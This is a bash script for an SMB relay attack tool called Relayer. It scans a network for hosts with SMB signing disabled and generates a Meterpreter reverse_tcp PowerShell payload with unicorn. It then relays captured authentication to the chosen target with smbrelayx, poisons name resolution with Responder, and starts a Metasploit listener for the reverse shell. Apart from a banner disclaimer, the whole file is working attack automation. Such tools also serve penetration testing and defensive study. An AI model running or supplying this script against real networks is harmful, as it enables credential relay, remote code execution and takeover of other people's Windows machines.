#!/bin/bash

# Relayer v1.0
# SMB Relay Script
#
# Jason Soto
# www.jasonsoto.com
# Twitter = @JsiTech

# Tool URL = github.com/jsitech/relayer

# Based from chuckle
# Credits to nccgroup

################################################################################


f_banner(){

echo
echo "

██████╗ ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗
██╔══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
██████╔╝█████╗  ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══╝  ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
██║  ██║███████╗███████╗██║  ██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

SMB Relay Script
By Jason Soto @jsitech

***************************************************************
* Running this tool without prior mutual consent is Illegal   *
* It is the END user responsibility to obey all applicable    *
* Laws. Author assume no liability and is not responsible for *
* any misuse of this tool.                                    *
***************************************************************
"
echo
echo

}

clear
f_banner

for port in 21/tcp 25/tcp 53/tcp 80/tcp 110/tcp 139/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 137/udp 138/udp 5553/udp; do
  if [ `fuser $port 2>&1 |wc -l` -gt 0 ]; then
    echo "port $port busy, please check"
    exit 0
  fi
done

echo "Please enter IP or Network to scan for SMB:" ; read network
nmap -n -Pn -sS --script smb-security-mode.nse -p445 -oA relayer $network  >>relayer.log &
echo "Scanning for SMB hosts and NETBIOS name...It may take a little while"
wait
echo > ./relayer.hosts

for ip in $(grep open relayer.gnmap |cut -d ' ' -f 2 ); do
  lines=$(grep -E -A 15 "for $ip$" relayer.nmap |grep disabled |wc -l)
  if [ $lines -gt 0 ]; then
      nbtname=$(nbtscan  $ip | awk -F" " '{print $2}' | tail -1)
      echo "$ip($nbtname)" >> ./relayer.hosts
  fi
done

if [[ -s relayer.hosts ]] ; then
	echo "Select SMB Relay Target:"
	hosts=$(<relayer.hosts)
	select tmptarget in $hosts
	do
    target=$(echo ${tmptarget%\(*})
		echo "Authentication attempts will be relayed to $tmptarget"
		break
	done
else
	echo "No SMB hosts found."
	exit
fi

echo "What System do you want the Metasploit Listener to run on? Select 1 or 2 and press ENTER"
echo ""
echo -e "1. Use my current local ip address"
echo ""
echo -e "2. Use an alternative system"
echo ""
read select
echo ""

if [ "$select" = "1" ]; then
  echo ""
  lhost=$(ip route get 1 | awk '{print $NF;exit}')
  echo "Please enter local port for reverse connection:" ; read lport
  echo "Meterpreter shell will connect back to $lhost on port $lport"
elif [ "$select" = "2" ]; then
  echo ""
  echo "Alternative System Selected"
  echo ""
  echo "What IP address do you want the Listener to run on?"
  echo -ne ">"; read lhost
  echo ""
  echo "Please enter port for reverse connection"
  echo -ne ">"; read lport
fi

echo "Generating Payload..."
python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport
payload=$(cat powershell_attack.txt)
echo "Payload created"
echo "Starting SMBRelayX..."

smbrelayx.py -h $target -c "$payload"  >> ./relayer.log  &
sleep 2

echo ""

netstat -i | cut -d ' ' -f1 | sed 1,2d >> ./relayer.ifaces

echo "Enter Interface to run Responder"
echo "Showing available interfaces:"
echo ""
ifaces=$(<relayer.ifaces)
echo -e "$ifaces"
echo ""
echo -ne ">" ; read netiface
echo ""
echo "Starting Responder on $netiface..."
responder -I $netiface -wrfF >> relayer.log &


echo "Setting up listener..."

msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set autorunscript post/windows/manage/migrate; exploit -j;"
